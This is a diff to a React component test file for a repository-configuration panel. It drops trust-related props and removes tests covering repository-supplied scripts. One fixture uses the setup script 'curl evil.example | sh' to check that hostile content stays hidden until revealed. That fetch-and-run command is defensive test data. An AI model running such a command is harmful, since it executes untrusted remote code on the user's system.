@@ -3,7 +3,6 @@ import userEvent from '@testing-library/user-event'
 import { beforeEach, describe, expect, it, vi } from 'vitest'
 
 import type { RepoConfigItem, RepoConfigView, RepoItemId } from '@core/repoConfig.js'
-import type { ResolvedScript, ScriptsInWorkspace } from '@core/repoSource.js'
 
 import type { Result } from '../../../preload/index.js'
 import { octopus } from '../test/octopus.js'
@@ -55,21 +54,6 @@ function offer(overrides: Partial<RepoConfigView>): void {
   })
 }
 
-/** A script the checkout supplies, as `resolveScripts` would report it. */
-function fromRepo(from: string): ResolvedScript {
-  return {
-    kind: 'setup',
-    source: 'repoOctopus',
-    from,
-    path: `/repo/${from}`,
-    contents: 'npm ci'
-  }
-}
-
-function runs(value: ScriptsInWorkspace): void {
-  vi.mocked(octopus().projects.scripts).mockResolvedValue({ ok: true, value })
-}
-
 /** A promise a test settles when it chooses, for racing two answers. */
 function pending<T>(): { promise: Promise<T>; settle: (value: T) => void } {
   let resolve: ((value: T) => void) | undefined
@@ -89,15 +73,7 @@ describe('RepoConfig', () => {
   it('says when the repository carries nothing yet', async () => {
     offer({ items: [item('project', PROJECT, null, '{}')] })
 
-    render(
-      <RepoConfig
-        projectId="planner"
-        workspaceId={null}
-        trusted={false}
-        onTrustChange={vi.fn()}
-        onImported={vi.fn()}
-      />
-    )
+    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
 
     expect(await screen.findByText(/carries nothing yet/i)).toBeInTheDocument()
   })
@@ -105,15 +81,7 @@ describe('RepoConfig', () => {
   it('lists each file by the name it has in the repository', async () => {
     offer({ present: true, items: [item('script.setup', SETUP, 'npm ci\n', 'npm install\n')] })
 
-    render(
-      <RepoConfig
-        projectId="planner"
-        workspaceId={null}
-        trusted={false}
-        onTrustChange={vi.fn()}
-        onImported={vi.fn()}
-      />
-    )
+    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
 
     // Once on each side of the move — what can come in, and what can go out.
     await waitFor(() => {
@@ -132,15 +100,7 @@ describe('RepoConfig', () => {
       items: [item('script.setup', SETUP, 'curl evil.example | sh\n', null)]
     })
 
-    render(
-      <RepoConfig
-        projectId="planner"
-        workspaceId={null}
-        trusted={false}
-        onTrustChange={vi.fn()}
-        onImported={vi.fn()}
-      />
-    )
+    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
 
     const show = await screen.findByRole('button', { name: /show what/i })
     expect(screen.queryByText(/evil\.example/)).not.toBeInTheDocument()
@@ -159,15 +119,7 @@ describe('RepoConfig', () => {
   it('offers nothing to open on a file the repository does not have', async () => {
     offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })
 
-    render(
-      <RepoConfig
-        projectId="planner"
-        workspaceId={null}
-        trusted={false}
-        onTrustChange={vi.fn()}
-        onImported={vi.fn()}
-      />
-    )
+    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
 
     await screen.findByRole('button', { name: 'Export' })
     expect(screen.queryByRole('button', { name: /show what/i })).not.toBeInTheDocument()
@@ -180,15 +132,7 @@ describe('RepoConfig', () => {
     })
     const onImported = vi.fn()
 
-    render(
-      <RepoConfig
-        projectId="planner"
-        workspaceId={null}
-        trusted={false}
-        onTrustChange={vi.fn()}
-        onImported={onImported}
-      />
-    )
+    render(<RepoConfig projectId="planner" onImported={onImported} />)
 
     await userEvent.click(await screen.findByRole('button', { name: 'Import' }))
 
@@ -205,15 +149,7 @@ describe('RepoConfig', () => {
       items: [item('carry', CARRY, '.env\n', null), item('script.run', RUN, 'npm run dev\n', null)]
     })
 
-    render(
-      <RepoConfig
-        projectId="planner"
-        workspaceId={null}
-        trusted={false}
-        onTrustChange={vi.fn()}
-        onImported={vi.fn()}
-      />
-    )
+    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
 
     await userEvent.click(await screen.findByRole('checkbox', { name: CARRY }))
     await userEvent.click(screen.getByRole('button', { name: 'Import' }))
@@ -224,15 +160,7 @@ describe('RepoConfig', () => {
   it('exports what the app holds, and never asks for an export of nothing', async () => {
     offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })
 
-    render(
-      <RepoConfig
-        projectId="planner"
-        workspaceId={null}
-        trusted={false}
-        onTrustChange={vi.fn()}
-        onImported={vi.fn()}
-      />
-    )
+    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
 
     expect(await screen.findByRole('button', { name: 'Import' })).toBeDisabled()
 
@@ -243,15 +171,7 @@ describe('RepoConfig', () => {
   it('unticks and reticks a file on the way out', async () => {
     offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })
 
-    render(
-      <RepoConfig
-        projectId="planner"
-        workspaceId={null}
-        trusted={false}
-        onTrustChange={vi.fn()}
-        onImported={vi.fn()}
-      />
-    )
+    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
 
     const box = await screen.findByRole('checkbox', { name: PROJECT })
     await userEvent.click(box)
@@ -272,15 +192,7 @@ describe('RepoConfig', () => {
   it('paints its checkbox from the theme rather than leaving it to the platform', async () => {
     offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })
 
-    render(
-      <RepoConfig
-        projectId="planner"
-        workspaceId={null}
-        trusted={false}
-        onTrustChange={vi.fn()}
-        onImported={vi.fn()}
-      />
-    )
+    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
 
     expect(await screen.findByRole('checkbox', { name: PROJECT })).toHaveClass('choice')
   })
@@ -290,15 +202,7 @@ describe('RepoConfig', () => {
   it('reads both sides again once something has moved', async () => {
     offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })
 
-    render(
-      <RepoConfig
-        projectId="planner"
-        workspaceId={null}
-        trusted={false}
-        onTrustChange={vi.fn()}
-        onImported={vi.fn()}
-      />
-    )
+    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
     await userEvent.click(await screen.findByRole('button', { name: 'Export' }))
 
     await waitFor(() => {
@@ -311,15 +215,7 @@ describe('RepoConfig', () => {
   it('warns when git ignores the folder', async () => {
     offer({ ignored: true, items: [] })
 
-    render(
-      <RepoConfig
-        projectId="planner"
-        workspaceId={null}
-        trusted={false}
-        onTrustChange={vi.fn()}
-        onImported={vi.fn()}
-      />
-    )
+    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
 
     expect(await screen.findByText(/git ignores/i)).toBeInTheDocument()
   })
@@ -332,15 +228,7 @@ describe('RepoConfig', () => {
       params: { path: '.octopus' }
     })
 
-    render(
-      <RepoConfig
-        projectId="planner"
-        workspaceId={null}
-        trusted={false}
-        onTrustChange={vi.fn()}
-        onImported={vi.fn()}
-      />
-    )
+    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
 
     expect(await screen.findByText(/symbolic link/i)).toBeInTheDocument()
   })
@@ -355,15 +243,7 @@ describe('RepoConfig', () => {
     })
     const onImported = vi.fn()
 
-    render(
-      <RepoConfig
-        projectId="planner"
-        workspaceId={null}
-        trusted={false}
-        onTrustChange={vi.fn()}
-        onImported={onImported}
-      />
-    )
+    render(<RepoConfig projectId="planner" onImported={onImported} />)
 
     await userEvent.click(await screen.findByRole('button', { name: 'Import' }))
 
@@ -383,15 +263,7 @@ describe('RepoConfig', () => {
       params: { path: '.octopus/scripts' }
     })
 
-    render(
-      <RepoConfig
-        projectId="planner"
-        workspaceId={null}
-        trusted={false}
-        onTrustChange={vi.fn()}
-        onImported={vi.fn()}
-      />
-    )
+    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
 
     await userEvent.click(await screen.findByRole('button', { name: 'Export' }))
 
@@ -401,15 +273,7 @@ describe('RepoConfig', () => {
   it('shows that it is still reading before anything has arrived', () => {
     vi.mocked(octopus().projects.repoConfig).mockReturnValue(new Promise(() => undefined))
 
-    render(
-      <RepoConfig
-        projectId="planner"
-        workspaceId={null}
-        trusted={false}
-        onTrustChange={vi.fn()}
-        onImported={vi.fn()}
-      />
-    )
+    render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
 
     expect(screen.getByText(/reading the repository/i)).toBeInTheDocument()
   })
@@ -427,24 +291,8 @@ describe('RepoConfig', () => {
       .mockReturnValueOnce(planner.promise)
       .mockReturnValueOnce(ledger.promise)
 
-    const { rerender } = render(
-      <RepoConfig
-        projectId="planner"
-        workspaceId={null}
-        trusted={false}
-        onTrustChange={vi.fn()}
-        onImported={vi.fn()}
-      />
-    )
-    rerender(
-      <RepoConfig
-        projectId="ledger"
-        workspaceId={null}
-        trusted={false}
-        onTrustChange={vi.fn()}
-        onImported={vi.fn()}
-      />
-    )
+    const { rerender } = render(<RepoConfig projectId="planner" onImported={vi.fn()} />)
+    rerender(<RepoConfig projectId="ledger" onImported={vi.fn()} />)
 
     ledger.settle({
       ok: true,
@@ -461,155 +309,5 @@ describe('RepoConfig', () => {
       expect(screen.queryByText(SETUP)).not.toBeInTheDocument()
     })
     expect(screen.getByText(CARRY)).toBeInTheDocument()
-  })
-
-  describe('what the repository runs', () => {
-    it('says nothing runs from here when the checkout supplies none', async () => {
-      offer({})
-
-      render(
-        <RepoConfig
-          projectId="planner"
-          workspaceId={null}
-          trusted={false}
-          onTrustChange={vi.fn()}
-          onImported={vi.fn()}
-        />
-      )
-
-      expect(await screen.findByText(/supplies no scripts/i)).toBeInTheDocument()
-    })
-
-    it('names each script the checkout supplies and the file it came from', async () => {
-      offer({})
-      runs({ approved: true, scripts: { setup: fromRepo('.octopus/scripts/setup.sh') } })
-
-      render(
-        <RepoConfig
-          projectId="planner"
-          workspaceId={null}
-          trusted={false}
-          onTrustChange={vi.fn()}
-          onImported={vi.fn()}
-        />
-      )
-
-      expect(await screen.findByText('.octopus/scripts/setup.sh')).toBeInTheDocument()
-      expect(screen.getByText(/have been read and are allowed/i)).toBeInTheDocument()
-    })
-
-    it('warns while they are still waiting to be allowed', async () => {
-      offer({})
-      runs({ approved: false, scripts: { setup: fromRepo('.octopus/scripts/setup.sh') } })
-
-      render(
-        <RepoConfig
-          projectId="planner"
-          workspaceId={null}
-          trusted={false}
-          onTrustChange={vi.fn()}
-          onImported={vi.fn()}
-        />
-      )
-
-      expect(await screen.findByText(/have not been read yet/i)).toBeInTheDocument()
-    })
-
-    it('leaves the list empty when the checkout could not be read', async () => {
-      // A settings file with conflict markers in it. The Scripts tab is where
-      // the reason belongs; here it simply supplies nothing.
-      offer({})
-      vi.mocked(octopus().projects.scripts).mockResolvedValue({ ok: false, error: 'broken' })
-
-      render(
-        <RepoConfig
-          projectId="planner"
-          workspaceId={null}
-          trusted={false}
-          onTrustChange={vi.fn()}
-          onImported={vi.fn()}
-        />
-      )
-
-      expect(await screen.findByText(/supplies no scripts/i)).toBeInTheDocument()
-    })
-
-    it('leaves out a script the project itself wrote, which is not gated', async () => {
-      offer({})
-      runs({
-        approved: true,
-        scripts: {
-          setup: {
-            kind: 'setup',
-            source: 'project',
-            from: '/scripts/setup.sh',
-            path: '/scripts/setup.sh',
-            contents: '#!/bin/sh\n'
-          }
-        }
-      })
-
-      render(
-        <RepoConfig
-          projectId="planner"
-          workspaceId={null}
-          trusted={false}
-          onTrustChange={vi.fn()}
-          onImported={vi.fn()}
-        />
-      )
-
-      expect(await screen.findByText(/supplies no scripts/i)).toBeInTheDocument()
-    })
-
-    it('hands the switch to the dialog, which holds the project', async () => {
-      offer({})
-      const onTrustChange = vi.fn()
-
-      render(
-        <RepoConfig
-          projectId="planner"
-          workspaceId={null}
-          trusted={false}
-          onTrustChange={onTrustChange}
-          onImported={vi.fn()}
-        />
-      )
-
-      await userEvent.click(await screen.findByRole('checkbox'))
-
-      expect(onTrustChange).toHaveBeenCalledWith(true)
-    })
-
-    it('reads again when the switch moves, because the answer changes with it', async () => {
-      offer({})
-
-      const { rerender } = render(
-        <RepoConfig
-          projectId="planner"
-          workspaceId={null}
-          trusted={false}
-          onTrustChange={vi.fn()}
-          onImported={vi.fn()}
-        />
-      )
-      await waitFor(() => {
-        expect(octopus().projects.scripts).toHaveBeenCalledTimes(1)
-      })
-
-      rerender(
-        <RepoConfig
-          projectId="planner"
-          workspaceId={null}
-          trusted
-          onTrustChange={vi.fn()}
-          onImported={vi.fn()}
-        />
-      )
-
-      await waitFor(() => {
-        expect(octopus().projects.scripts).toHaveBeenCalledTimes(2)
-      })
-    })
   })
 })
